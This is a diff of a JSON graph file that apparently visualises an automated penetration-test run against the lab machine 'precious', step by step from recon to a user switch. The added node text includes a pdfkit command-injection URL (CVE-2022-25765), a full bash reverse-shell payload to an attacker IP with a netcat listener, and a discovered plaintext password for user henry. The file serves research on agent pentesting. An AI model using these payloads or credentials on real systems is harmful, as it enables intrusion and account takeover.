@@ -1,7 +1,7 @@
 {
   "paper_analogy": "Deep Reinforcement Learning on Graphs for Autonomous Search-and-Track",
-  "machine": "Precious",
-  "source": "training_data.csv, Machine == 'Precious', 8 row(s), 1 auto-detected run(s)/playthroughs. Graph built directly from the PTT (Penetration Testing Tree) field's growth.",
+  "machine": "precious",
+  "source": "training_data.csv, Machine == 'precious', 13 row(s), 1 auto-detected run(s)/playthroughs. Graph built directly from the PTT (Penetration Testing Tree) field's growth.",
   "analogy_mapping": {
     "Agent Nodes": "PTT snapshot reached after each new tree item (state = cumulative tree)",
     "Search Nodes": "The PTT tree item worked on (number + title) + its MCP_tasks tool calls",
@@ -22,11 +22,11 @@
   },
   "nodes": [
     {
-      "id": "agent:Precious:START",
+      "id": "agent:precious:START",
       "label": "Agent: Initial\n(Start)",
       "type": "Agent",
       "color": "#3A86FF",
-      "title": "Start of pentest against 'Precious'. 1 recorded run(s) below.",
+      "title": "Start of pentest against 'precious'. 1 recorded run(s) below.",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -36,11 +36,11 @@
       }
     },
     {
-      "id": "search:Precious:r1_s1_2",
-      "label": "Search: 2\nWeb application analysis",
+      "id": "search:precious:r1_base",
+      "label": "Search: Baseline\n(2 item(s))",
       "type": "Search",
       "color": "#FB5607",
-      "title": "PTT item 2: Web application analysis\n\nMCP tool calls:\nNmap: Perform port scan with service version detection on target",
+      "title": "Baseline recon already completed before this run's first tracked step:\n1.3.1 Perform a port scan\n1.3.2 Determine the services and versions on each open port",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -50,11 +50,11 @@
       }
     },
     {
-      "id": "track:Precious:r1_s1_2",
-      "label": "Track: Web application analysis",
+      "id": "track:precious:r1_base",
+      "label": "Track: Determine the services an\u2026",
       "type": "Track",
       "color": "#06D6A0",
-      "title": "2 Web application analysis:\n(status change only)",
+      "title": "1.3.1 Perform a port scan: Host: precious.htb (10.129.228.98), Host Status: Up, Latency: 0.85s, Total IP addresses scanned: 1 (1 host up), Scan Duration: 91.84 seconds\n\n1.3.2 Determine the services and versions on each open port: Port: 22/tcp - State: Open, Service: ssh, Version: OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0), ssh-hostkey: RSA: 3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2, ECDSA: 256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92, ED25519: 256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58; \n       Port: 80/tcp - State: Open, Service: http, Version: nginx 1.18.0, http-title: Convert Web Page to PDF, http-server-header: nginx/1.18.0 + Phusion Passenger(R) 6.0.15, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}\n   1.4 Target IP: 10.129.228.98 - [updated]",
       "size": 34,
       "shape": "dot",
       "borderColor": "#212529",
@@ -64,11 +64,11 @@
       }
     },
     {
-      "id": "agent:Precious:r1_s1_2",
-      "label": "Agent: 2\nWeb application analy\u2026",
+      "id": "agent:precious:r1_base",
+      "label": "Agent: Baseline\nIdentify Open Ports, \u2026",
       "type": "Agent",
       "color": "#3A86FF",
-      "title": "Cumulative PTT after 2:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Network enumeration\n  \u2713 1.2 Subdomain enumeration\n\u25cb 2 Web application analysis\n  \u25cb 2.1 Application fingerprinting",
+      "title": "Cumulative PTT so far:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -78,11 +78,11 @@
       }
     },
     {
-      "id": "search:Precious:r1_s1_2.1",
-      "label": "Search: 2.1\nApplication fingerprinting",
+      "id": "search:precious:r1_s1_1.5",
+      "label": "Search: 1.5\nEnumerate HTTP service",
       "type": "Search",
       "color": "#FB5607",
-      "title": "PTT item 2.1: Application fingerprinting\n\nMCP tool calls:\nNmap: Perform port scan with service version detection on target",
+      "title": "PTT item 1.5: Enumerate HTTP service\n\nMCP tool calls:\n- Dirbuster: Brute force hidden directories and files on the HTTP service.\n- Nmap: Enumerate software versions on the HTTP service.",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -92,11 +92,11 @@
       }
     },
     {
-      "id": "track:Precious:r1_s1_2.1",
-      "label": "Track: Application fingerprinting",
+      "id": "track:precious:r1_s1_1.5",
+      "label": "Track: Method: GET, URL: http://10.1\u2026",
       "type": "Track",
       "color": "#06D6A0",
-      "title": "2.1 Application fingerprinting:\n(status change only)",
+      "title": "1.5 Enumerate HTTP service:\nMethod: GET, URL: http://10.10.11.189, Wordlist: FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt, Header: Host: FUZZ.precious.htb, Follow redirects: false, Calibration: true, Timeout: 10, Threads: 40, Matcher: Response status: all, Progress: 19966/19966, Job: 1/1, Request Speed: 459 req/sec, Duration: 42 seconds, Errors: 0, Note: No significant findings were reported by the tool.",
       "size": 34,
       "shape": "dot",
       "borderColor": "#212529",
@@ -106,11 +106,11 @@
       }
     },
     {
-      "id": "agent:Precious:r1_s1_2.1",
-      "label": "Agent: 2.1\nWeb application analy\u2026",
+      "id": "agent:precious:r1_s1_1.5",
+      "label": "Agent: 1.5\nReconnaissance",
       "type": "Agent",
       "color": "#3A86FF",
-      "title": "Cumulative PTT after 2.1:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Network enumeration\n  \u2713 1.2 Subdomain enumeration\n\u25cb 2 Web application analysis\n  \u25cb 2.1 Application fingerprinting",
+      "title": "Cumulative PTT after 1.5:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n  \u2713 1.5 Enumerate HTTP service",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -120,11 +120,11 @@
       }
     },
     {
-      "id": "search:Precious:r1_s2_3",
-      "label": "Search: 3\nVulnerability exploitation",
+      "id": "search:precious:r1_s2_1.6",
+      "label": "Search: 1.6\nEnumerate the website",
       "type": "Search",
       "color": "#FB5607",
-      "title": "PTT item 3: Vulnerability exploitation\n\nMCP tool calls:\nWeb page interaction: Submit test URL for PDF conversion, Interactive CLI: Use exiftool to extract PDF metadata and identify generation library",
+      "title": "PTT item 1.6: Enumerate the website\n\nMCP tool calls:\n- Dirbuster: Brute force hidden directories and links on the web service.\n- Web page interaction: Identify and analyze the software used by the web service.",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -134,11 +134,11 @@
       }
     },
     {
-      "id": "track:Precious:r1_s2_3",
-      "label": "Track: Vulnerability exploitation",
+      "id": "track:precious:r1_s2_1.6",
+      "label": "Track: Service: Convert web pages in\u2026",
       "type": "Track",
       "color": "#06D6A0",
-      "title": "3 Vulnerability exploitation:\n(status change only)",
+      "title": "1.6 Enumerate the website:\nService: Convert web pages into PDF, Key Widget: Input box to enter URL for conversion, Test Result: Attempted URLs of the target machine and local URLs did not work. These seem to be filtered by the service.",
       "size": 34,
       "shape": "dot",
       "borderColor": "#212529",
@@ -148,11 +148,11 @@
       }
     },
     {
-      "id": "agent:Precious:r1_s2_3",
-      "label": "Agent: 3\nVulnerability exploit\u2026",
+      "id": "agent:precious:r1_s2_1.6",
+      "label": "Agent: 1.6\nReconnaissance",
       "type": "Agent",
       "color": "#3A86FF",
-      "title": "Cumulative PTT after 3:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Network enumeration\n  \u2713 1.2 Subdomain enumeration\n\u2713 2 Web application analysis\n  \u2713 2.1 Application fingerprinting\n\u25cb 3 Vulnerability exploitation\n  \u25cb 3.1 Command injection testing",
+      "title": "Cumulative PTT after 1.6:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n  \u2713 1.5 Enumerate HTTP service\n  \u2713 1.6 Enumerate the website",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -162,11 +162,11 @@
       }
     },
     {
-      "id": "search:Precious:r1_s2_3.1",
-      "label": "Search: 3.1\nCommand injection testing",
+      "id": "search:precious:r1_s3_1.7",
+      "label": "Search: 1.7\nIntercept and analyze the\u2026",
       "type": "Search",
       "color": "#FB5607",
-      "title": "PTT item 3.1: Command injection testing\n\nMCP tool calls:\nWeb page interaction: Submit test URL for PDF conversion, Interactive CLI: Use exiftool to extract PDF metadata and identify generation library",
+      "title": "PTT item 1.7: Intercept and analyze the request and response\n\nMCP tool calls:\n- Web page interaction: Further enumerate the website by intercepting and analyzing requests and responses.",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -176,11 +176,11 @@
       }
     },
     {
-      "id": "track:Precious:r1_s2_3.1",
-      "label": "Track: Command injection testing",
+      "id": "track:precious:r1_s3_1.7",
+      "label": "Track: Request Type: POST, Host: pre\u2026",
       "type": "Track",
       "color": "#06D6A0",
-      "title": "3.1 Command injection testing:\n(status change only)",
+      "title": "1.7 Intercept and analyze the request and response:\nRequest Type: POST, Host: precious.htb, User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0, Content-Type: application/x-www-form-urlencoded, Origin: http://precious.htb, Referer: http://precious.htb/, Request Body: url=http%3A%2F%2F10.10.16.163+, Response Status: HTTP/1.1 200 OK, Content-Type: application/pdf, Content-Length: 4595, Content-Disposition: attachment; filename=\"4fsq7xpd1ujl99v9m0duiuu3v4oi4iml.pdf\", X-Powered-By: Phusion Passenger(R) 6.0.15, Server: nginx/1.18.0 + Phusion Passenger(R) 6.0.15, X-Runtime: Ruby, Additional Information: The server is running Ruby and Phusion Passenger, a web application server that supports Ruby, Python, Node, and Meteor applications. When a local website was hosted and asked the service to convert it to a PDF, it was successful and a PDF got downloaded.",
       "size": 34,
       "shape": "dot",
       "borderColor": "#212529",
@@ -190,11 +190,11 @@
       }
     },
     {
-      "id": "agent:Precious:r1_s2_3.1",
-      "label": "Agent: 3.1\nVulnerability exploit\u2026",
+      "id": "agent:precious:r1_s3_1.7",
+      "label": "Agent: 1.7\nReconnaissance",
       "type": "Agent",
       "color": "#3A86FF",
-      "title": "Cumulative PTT after 3.1:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Network enumeration\n  \u2713 1.2 Subdomain enumeration\n\u2713 2 Web application analysis\n  \u2713 2.1 Application fingerprinting\n\u25cb 3 Vulnerability exploitation\n  \u25cb 3.1 Command injection testing",
+      "title": "Cumulative PTT after 1.7:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n  \u2713 1.5 Enumerate HTTP service\n  \u2713 1.6 Enumerate the website\n  \u2713 1.7 Intercept and analyze the request and response",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -204,11 +204,11 @@
       }
     },
     {
-      "id": "search:Precious:r1_s3_4",
-      "label": "Search: 4\nPrivilege escalation to h\u2026",
+      "id": "search:precious:r1_s4_1.8",
+      "label": "Search: 1.8\nExplore the suspicious fi\u2026",
       "type": "Search",
       "color": "#FB5607",
-      "title": "PTT item 4: Privilege escalation to henry\n\nMCP tool calls:\nWeb page interaction: Submit malicious URL through PDF generation form, Interactive CLI: Setup HTTP listener to receive callback, prepare reverse shell payload",
+      "title": "PTT item 1.8: Explore the suspicious files and create a summary of the findings\n\nMCP tool calls:\n- Interactive CLI: Explore the downloaded PDF to find software versions and summarize findings.",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -218,11 +218,11 @@
       }
     },
     {
-      "id": "track:Precious:r1_s3_4",
-      "label": "Track: Privilege escalation to henry",
+      "id": "track:precious:r1_s4_1.8",
+      "label": "Track: PDF Metadata Summary: Tool Us\u2026",
       "type": "Track",
       "color": "#06D6A0",
-      "title": "4 Privilege escalation to henry:\n(status change only)",
+      "title": "1.8 Explore the suspicious files and create a summary of the findings:\nPDF Metadata Summary: Tool Used: exiftool, Metadata Key: \"Creator\", Metadata Value: \"Generated by pdfkit v0.8.6\"",
       "size": 34,
       "shape": "dot",
       "borderColor": "#212529",
@@ -232,11 +232,11 @@
       }
     },
     {
-      "id": "agent:Precious:r1_s3_4",
-      "label": "Agent: 4\nPrivilege escalation \u2026",
+      "id": "agent:precious:r1_s4_1.8",
+      "label": "Agent: 1.8\nReconnaissance",
       "type": "Agent",
       "color": "#3A86FF",
-      "title": "Cumulative PTT after 4:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Network enumeration\n  \u2713 1.2 Subdomain enumeration\n\u2713 2 Web application analysis\n  \u2713 2.1 Application fingerprinting\n\u2713 3 Vulnerability exploitation\n  \u2713 3.1 Command injection testing\n\u25cb 4 Privilege escalation to henry\n  \u25cb 4.1 Credential discovery",
+      "title": "Cumulative PTT after 1.8:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n  \u2713 1.5 Enumerate HTTP service\n  \u2713 1.6 Enumerate the website\n  \u2713 1.7 Intercept and analyze the request and response\n  \u2713 1.8 Explore the suspicious files and create a summary of the findings",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -246,11 +246,11 @@
       }
     },
     {
-      "id": "search:Precious:r1_s3_4.1",
-      "label": "Search: 4.1\nCredential discovery",
+      "id": "search:precious:r1_s5_1.9",
+      "label": "Search: 1.9\nVulnerability Assessment \u2026",
       "type": "Search",
       "color": "#FB5607",
-      "title": "PTT item 4.1: Credential discovery\n\nMCP tool calls:\nWeb page interaction: Submit malicious URL through PDF generation form, Interactive CLI: Setup HTTP listener to receive callback, prepare reverse shell payload",
+      "title": "PTT item 1.9: Vulnerability Assessment on pdfkit v0.8.6\n\nMCP tool calls:\n- Google search: Search for vulnerabilities and exploits related to pdfkit v0.8.6",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -260,11 +260,11 @@
       }
     },
     {
-      "id": "track:Precious:r1_s3_4.1",
-      "label": "Track: Credential discovery",
+      "id": "track:precious:r1_s5_1.9",
+      "label": "Track: PDFKit v0.8.6 Vulnerabilities\u2026",
       "type": "Track",
       "color": "#06D6A0",
-      "title": "4.1 Credential discovery:\n(status change only)",
+      "title": "1.9 Vulnerability Assessment on pdfkit v0.8.6:\nPDFKit v0.8.6 Vulnerabilities Summary: Command Injection (CVE-2022-25765) - Vulnerable to command injection due to improper sanitization of the URL parameter used to generate a PDF. Impact: Can lead to total loss of confidentiality, integrity, and availability, local file inclusion (LFI), data exposure, and server-side request forgery (SSRF). Exploitation: PoC exploits are publicly available. Fix: Upgrade to PDFKit v0.8.7.2 or higher. Vulnerabilities related to wkhtmltopdf (PDFKit's dependency) - Directory Traversal (CVE-2020-21365): Can lead to disclosure of sensitive information if a crafted HTML file is provided. Server-Side Request Forgery (SSRF) (CVE-2022-35583): Can lead to a takeover of the infrastructure by injecting an 'iframe' tag with an internal asset's IP address in its source. Mitigation: Upgrade PDFKit to v0.8.7.2 or higher. Sanitize and validate any user-supplied input before passing it to PDFKit or wkhtmltopdf functions. If wkhtmltopdf is directly used, ensure it is also updated to a patched version.",
       "size": 34,
       "shape": "dot",
       "borderColor": "#212529",
@@ -274,11 +274,11 @@
       }
     },
     {
-      "id": "agent:Precious:r1_s3_4.1",
-      "label": "Agent: 4.1\nPrivilege escalation \u2026",
+      "id": "agent:precious:r1_s5_1.9",
+      "label": "Agent: 1.9\nReconnaissance",
       "type": "Agent",
       "color": "#3A86FF",
-      "title": "Cumulative PTT after 4.1:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Network enumeration\n  \u2713 1.2 Subdomain enumeration\n\u2713 2 Web application analysis\n  \u2713 2.1 Application fingerprinting\n\u2713 3 Vulnerability exploitation\n  \u2713 3.1 Command injection testing\n\u25cb 4 Privilege escalation to henry\n  \u25cb 4.1 Credential discovery",
+      "title": "Cumulative PTT after 1.9:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n  \u2713 1.5 Enumerate HTTP service\n  \u2713 1.6 Enumerate the website\n  \u2713 1.7 Intercept and analyze the request and response\n  \u2713 1.8 Explore the suspicious files and create a summary of the findings\n  \u2713 1.9 Vulnerability Assessment on pdfkit v0.8.6",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -288,11 +288,11 @@
       }
     },
     {
-      "id": "search:Precious:r1_s4_5",
-      "label": "Search: 5\nLateral movement",
+      "id": "search:precious:r1_s6_1.10",
+      "label": "Search: 1.10\nExploit the CVE-2022-2576\u2026",
       "type": "Search",
       "color": "#FB5607",
-      "title": "PTT item 5: Lateral movement\n\nMCP tool calls:\nInteractive CLI: Enumerate /home/ruby directory structure, examine .bundle/config and other configuration files for credentials",
+      "title": "PTT item 1.10: Exploit the CVE-2022-25765 vulnerability\n\nMCP tool calls:\n- Metasploit: Use Metasploit to exploit the CVE-2022-25765 vulnerability in pdfkit v0.8.6.",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -302,11 +302,11 @@
       }
     },
     {
-      "id": "track:Precious:r1_s4_5",
-      "label": "Track: Lateral movement",
+      "id": "track:precious:r1_s6_1.10",
+      "label": "Track: Command Injection Test Summar\u2026",
       "type": "Track",
       "color": "#06D6A0",
-      "title": "5 Lateral movement:\n(status change only)",
+      "title": "1.10 Exploit the CVE-2022-25765 vulnerability:\nCommand Injection Test Summary: Test URL: http://10.10.14.6/?name=%20`id`, Result: Successful command injection. The response returned \"uid=1001(ruby)\", indicating that the injected 'id' command was executed successfully.",
       "size": 34,
       "shape": "dot",
       "borderColor": "#212529",
@@ -316,11 +316,11 @@
       }
     },
     {
-      "id": "agent:Precious:r1_s4_5",
-      "label": "Agent: 5\nLateral movement",
+      "id": "agent:precious:r1_s6_1.10",
+      "label": "Agent: 1.10\nReconnaissance",
       "type": "Agent",
       "color": "#3A86FF",
-      "title": "Cumulative PTT after 5:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Network enumeration\n  \u2713 1.2 Subdomain enumeration\n\u2713 2 Web application analysis\n  \u2713 2.1 Application fingerprinting\n\u2713 3 Vulnerability exploitation\n  \u2713 3.1 Command injection testing\n\u2713 4 Privilege escalation to henry\n  \u2713 4.1 Credential discovery\n\u25cb 5 Lateral movement\n  \u25cb 5.1 Switch user to henry",
+      "title": "Cumulative PTT after 1.10:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n  \u2713 1.5 Enumerate HTTP service\n  \u2713 1.6 Enumerate the website\n  \u2713 1.7 Intercept and analyze the request and response\n  \u2713 1.8 Explore the suspicious files and create a summary of the findings\n  \u2713 1.9 Vulnerability Assessment on pdfkit v0.8.6\n  \u2713 1.10 Exploit the CVE-2022-25765 vulnerability",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -330,11 +330,11 @@
       }
     },
     {
-      "id": "search:Precious:r1_s4_5.1",
-      "label": "Search: 5.1\nSwitch user to henry",
+      "id": "search:precious:r1_s7_1.11",
+      "label": "Search: 1.11\nObtain a reverse shell",
       "type": "Search",
       "color": "#FB5607",
-      "title": "PTT item 5.1: Switch user to henry\n\nMCP tool calls:\nInteractive CLI: Enumerate /home/ruby directory structure, examine .bundle/config and other configuration files for credentials",
+      "title": "PTT item 1.11: Obtain a reverse shell\n\nMCP tool calls:\n- Metasploit: Use Metasploit to set up a reverse shell payload and exploit the command injection vulnerability.\n- Netcat: Set up a listener on the attacker's machine and use the command injection to connect back to it.",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -344,11 +344,11 @@
       }
     },
     {
-      "id": "track:Precious:r1_s4_5.1",
-      "label": "Track: Switch user to henry",
+      "id": "track:precious:r1_s7_1.11",
+      "label": "Track: Reverse Shell Test Summary: T\u2026",
       "type": "Track",
       "color": "#06D6A0",
-      "title": "5.1 Switch user to henry:\n(status change only)",
+      "title": "1.11 Obtain a reverse shell:\nReverse Shell Test Summary: Test URL: http://10.10.16.163/?name=%20`bash -c \"bash -i >& /dev/tcp/10.10.16.163/4444 0>&1\"`, Command used: nc -lnvp 4444, Result: Successful reverse shell obtained. The connection was received on 10.129.228.98 35868, Shell user: The 'whoami' command returned 'ruby', indicating that the reverse shell was obtained as the user 'ruby'.",
       "size": 34,
       "shape": "dot",
       "borderColor": "#212529",
@@ -358,11 +358,11 @@
       }
     },
     {
-      "id": "agent:Precious:r1_s4_5.1",
-      "label": "Agent: 5.1\nLateral movement",
+      "id": "agent:precious:r1_s7_1.11",
+      "label": "Agent: 1.11\nReconnaissance",
       "type": "Agent",
       "color": "#3A86FF",
-      "title": "Cumulative PTT after 5.1:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Network enumeration\n  \u2713 1.2 Subdomain enumeration\n\u2713 2 Web application analysis\n  \u2713 2.1 Application fingerprinting\n\u2713 3 Vulnerability exploitation\n  \u2713 3.1 Command injection testing\n\u2713 4 Privilege escalation to henry\n  \u2713 4.1 Credential discovery\n\u25cb 5 Lateral movement\n  \u25cb 5.1 Switch user to henry",
+      "title": "Cumulative PTT after 1.11:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n  \u2713 1.5 Enumerate HTTP service\n  \u2713 1.6 Enumerate the website\n  \u2713 1.7 Intercept and analyze the request and response\n  \u2713 1.8 Explore the suspicious files and create a summary of the findings\n  \u2713 1.9 Vulnerability Assessment on pdfkit v0.8.6\n  \u2713 1.10 Exploit the CVE-2022-25765 vulnerability\n  \u2713 1.11 Obtain a reverse shell",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -372,11 +372,11 @@
       }
     },
     {
-      "id": "search:Precious:r1_s5_6",
-      "label": "Search: 6\nRoot privilege escalation",
+      "id": "search:precious:r1_s8_1.12",
+      "label": "Search: 1.12\nEnumerate the machine",
       "type": "Search",
       "color": "#FB5607",
-      "title": "PTT item 6: Root privilege escalation\n\nMCP tool calls:\nInteractive CLI: Execute su - henry with discovered password, Netcat: Test SSH connection with henry:Q3c1AqGHtoI0aXAYFH if su successful",
+      "title": "PTT item 1.12: Enumerate the machine\n\nMCP tool calls:\n- Interactive CLI: Explore suspicious files and directories, check privileges of user 'ruby', and create a summary of findings.",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -386,11 +386,11 @@
       }
     },
     {
-      "id": "track:Precious:r1_s5_6",
-      "label": "Track: Root privilege escalation",
+      "id": "track:precious:r1_s8_1.12",
+      "label": "Track: Home Directory Exploration Su\u2026",
       "type": "Track",
       "color": "#06D6A0",
-      "title": "6 Root privilege escalation:\n(status change only)",
+      "title": "1.12 Enumerate the machine:\nHome Directory Exploration Summary: Directory: /home/ruby, Listed items: .bash_history symlinked to /dev/null, Regular files: .bash_logout, .bashrc, .profile, .bundle directory owned by root and user 'ruby', .cache directory owned by 'ruby', Notable Find: The .bundle directory contains configuration information for Bundler, a dependency management tool used in Ruby projects. The configuration file (.bundle/config) reveals a potential username and password pair: \"henry:Q3c1AqGHtoI0aXAYFH\".",
       "size": 34,
       "shape": "dot",
       "borderColor": "#212529",
@@ -400,11 +400,11 @@
       }
     },
     {
-      "id": "agent:Precious:r1_s5_6",
-      "label": "Agent: 6\nRoot privilege escala\u2026",
+      "id": "agent:precious:r1_s8_1.12",
+      "label": "Agent: 1.12\nReconnaissance",
       "type": "Agent",
       "color": "#3A86FF",
-      "title": "Cumulative PTT after 6:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Network enumeration\n  \u2713 1.2 Subdomain enumeration\n\u2713 2 Web application analysis\n  \u2713 2.1 Application fingerprinting\n\u2713 3 Vulnerability exploitation\n  \u2713 3.1 Command injection testing\n\u2713 4 Privilege escalation to henry\n  \u2713 4.1 Credential discovery\n\u2713 5 Lateral movement\n  \u2713 5.1 Switch user to henry\n\u25cb 6 Root privilege escalation\n  \u25cb 6.1 Sudo enumeration",
+      "title": "Cumulative PTT after 1.12:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n  \u2713 1.5 Enumerate HTTP service\n  \u2713 1.6 Enumerate the website\n  \u2713 1.7 Intercept and analyze the request and response\n  \u2713 1.8 Explore the suspicious files and create a summary of the findings\n  \u2713 1.9 Vulnerability Assessment on pdfkit v0.8.6\n  \u2713 1.10 Exploit the CVE-2022-25765 vulnerability\n  \u2713 1.11 Obtain a reverse shell\n  \u2713 1.12 Enumerate the machine",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -414,11 +414,11 @@
       }
     },
     {
-      "id": "search:Precious:r1_s5_6.1",
-      "label": "Search: 6.1\nSudo enumeration",
+      "id": "search:precious:r1_s9_1.13",
+      "label": "Search: 1.13\nSwitch user to 'henry'",
       "type": "Search",
       "color": "#FB5607",
-      "title": "PTT item 6.1: Sudo enumeration\n\nMCP tool calls:\nInteractive CLI: Execute su - henry with discovered password, Netcat: Test SSH connection with henry:Q3c1AqGHtoI0aXAYFH if su successful",
+      "title": "PTT item 1.13: Switch user to 'henry'\n\nMCP tool calls:\n- Metasploit: Exploit the discovered credentials to switch user to 'henry'.",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -428,11 +428,11 @@
       }
     },
     {
-      "id": "track:Precious:r1_s5_6.1",
-      "label": "Track: Sudo enumeration",
+      "id": "track:precious:r1_s9_1.13",
+      "label": "Track: Shell Acquisition Summary: Re\u2026",
       "type": "Track",
       "color": "#06D6A0",
-      "title": "6.1 Sudo enumeration:\n(status change only)",
+      "title": "1.13 Switch user to 'henry':\nShell Acquisition Summary: Result: Successfully obtained the shell as user 'henry'.",
       "size": 34,
       "shape": "dot",
       "borderColor": "#212529",
@@ -442,11 +442,11 @@
       }
     },
     {
-      "id": "agent:Precious:r1_s5_6.1",
-      "label": "Agent: 6.1\nRoot privilege escala\u2026",
+      "id": "agent:precious:r1_s9_1.13",
+      "label": "Agent: 1.13\nReconnaissance",
       "type": "Agent",
       "color": "#3A86FF",
-      "title": "Cumulative PTT after 6.1:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Network enumeration\n  \u2713 1.2 Subdomain enumeration\n\u2713 2 Web application analysis\n  \u2713 2.1 Application fingerprinting\n\u2713 3 Vulnerability exploitation\n  \u2713 3.1 Command injection testing\n\u2713 4 Privilege escalation to henry\n  \u2713 4.1 Credential discovery\n\u2713 5 Lateral movement\n  \u2713 5.1 Switch user to henry\n\u25cb 6 Root privilege escalation\n  \u25cb 6.1 Sudo enumeration",
+      "title": "Cumulative PTT after 1.13:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n  \u2713 1.5 Enumerate HTTP service\n  \u2713 1.6 Enumerate the website\n  \u2713 1.7 Intercept and analyze the request and response\n  \u2713 1.8 Explore the suspicious files and create a summary of the findings\n  \u2713 1.9 Vulnerability Assessment on pdfkit v0.8.6\n  \u2713 1.10 Exploit the CVE-2022-25765 vulnerability\n  \u2713 1.11 Obtain a reverse shell\n  \u2713 1.12 Enumerate the machine\n  \u2713 1.13 Switch user to 'henry'",
       "size": 40,
       "shape": "dot",
       "borderColor": "#212529",
@@ -456,95 +456,11 @@
       }
     },
     {
-      "id": "search:Precious:r1_s6_7",
-      "label": "Search: 7\nYAML deserialization",
-      "type": "Search",
-      "color": "#FB5607",
-      "title": "PTT item 7: YAML deserialization\n\nMCP tool calls:\nInteractive CLI: Run sudo -l to enumerate sudo privileges for henry user",
-      "size": 40,
-      "shape": "dot",
-      "borderColor": "#212529",
-      "borderWidth": 3,
-      "font": {
-        "color": "#212529"
-      }
-    },
-    {
-      "id": "track:Precious:r1_s6_7",
-      "label": "Track: YAML deserialization",
-      "type": "Track",
-      "color": "#06D6A0",
-      "title": "7 YAML deserialization:\n(status change only)",
-      "size": 34,
-      "shape": "dot",
-      "borderColor": "#212529",
-      "borderWidth": 3,
-      "font": {
-        "color": "#212529"
-      }
-    },
-    {
-      "id": "agent:Precious:r1_s6_7",
-      "label": "Agent: 7\nYAML deserialization",
